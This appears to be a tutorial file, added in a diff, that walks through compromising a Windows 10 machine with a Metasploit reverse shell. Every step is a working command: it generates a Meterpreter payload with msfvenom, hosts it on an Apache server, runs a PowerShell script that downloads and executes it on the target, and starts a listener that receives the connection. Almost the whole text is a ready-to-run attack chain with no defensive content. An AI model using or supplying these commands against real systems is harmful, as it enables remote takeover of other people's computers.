@@ -1,0 +1,96 @@
+STEP 1: Create your payload using msfvenom. 
+  
+ -For the sake of this tutorial, I will be targeting WINDOWS 10
+ -Run the following command from your Kali machine to create the payload:
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=1337 -f exe > shell.exe
+
+ -Change LHOST to the IP of your Kali machine
+ -Change LPORT to the port number of your choice, you can leave it as 1337 for simplicity
+
+
+
+STEP 2: Copy your Meterpreter payload to your Apache2 folder using the following command:
+
+ cp shell.exe /var/www/html
+
+
+
+STEP 3: Start your Apache2 service on the Kali/Attacking machine using the following command:
+
+ service apache2 start
+
+
+OPTIONAL: Using your Web Browser, navigate to the URL of your Meterpreter payload to ensure it's ready to download
+
+ http://192.168.1.3/shell.exe
+          
+	     ^replace '192.168.1.3' with the IP of your Kali machine
+
+
+
+STEP 4: The following command is for a Powershell script. It will be used to download your Meterpreter payload
+
+ (new-object System.Net.WebClient).DownloadFile("http://192.168.1.3/shell.exe", "c:\Users\cobalt\Desktop\shell.exe")
+							 ^KALI IP^			^Windows file path^
+
+ -change the IP to the address of your KALI machine
+	EXAMPLE: "http://YOUR-IP/shell.exe"
+
+ -change the Windows file path to the Desktop directory of your TARGET WINDOWS machine
+	EXAMPLE: "c:\Users\YOUR-USERNAME\Desktop\shell.exe"
+
+
+
+STEP 5: Finalize the Powershell script so you can run it on your target windows machine.
+
+ -THE FOLLOWING IS AN EXAMPLE OF HOW YOUR POWERSHELL SCRIPT SHOULD LOOK:
+
+(new-object System.Net.WebClient).DownloadFile("http://192.168.1.3/shell.exe", "c:\Users\cobalt\Desktop\shell.exe")
+c:\Users\cobalt\Desktop\shell.exe
+
+ -Put the two lines of code in an empty text file and save it as "payload.ps1" and it will be saved as a Powershell script.
+
+
+
+STEP 6: Move to your Kali machine, start Metasploit and set up your handler/listener to await the connection from the Reverse Meterpreter Payload
+
+ -Type the following commands into your Kali terminal
+
+service postgresql start
+msfconsole
+use exploit/multi/handler
+set LHOST 192.168.1.3
+set LPORT 1337
+run
+
+ -Make sure to change LHOST to the IP of your Kali machine, and LPORT to the port you selected when generating your meterpreter payload
+
+
+
+STEP 7: Right click on your Powershell payload "payload.ps1", and select "Run with Powershell"
+
+
+CONGRATULATIONS! Check your Metasploit terminal on your Kali machine, and you should have succesfully popped a meterpreter shell.
+
+
+
+LET'S REVIEW:
+
+1: We created a Windows payload using:    msfvenom -p windows/meterpreter/reverse_tcp LHOST=Kali_IP LPORT=Target_Port -f exe > shell.exe
+
+2: We copied the Windows Meterpreter payload into the Apache2 directory using:    cp shell.exe /var/www/html
+
+3: We start our Apache2 service on our Kali machine using:    service apache2 start
+
+OPTIONAL: To confirm we are hosting the payload, browse to the address of our shell.exe payload using our web browser:   http://192.168.x.x/shell.exe
+
+4: We prepared our Powershell command:  (new-object System.Net.WebClient).DownloadFile("http://KALI-IP/shell.exe", "c:\Users\YOUR-USERNAME\Desktop\shell.exe")
+
+5: We created a Powershell script using the powershell command, and saved it as "payload.ps1" - The first line downloads the payload, the second line launches it
+
+6: We start metasploit on our Kali machine, we select and configure a handler/listener to wait for the Reverse-Meterpreter's connection, we run the handler
+
+7: We run our Powershell script, it downloads and runs our Meterpreter payload
+
+BOOM, we have a Reverse Meterpreter Shell running on our Windows 10 target. #PWNED
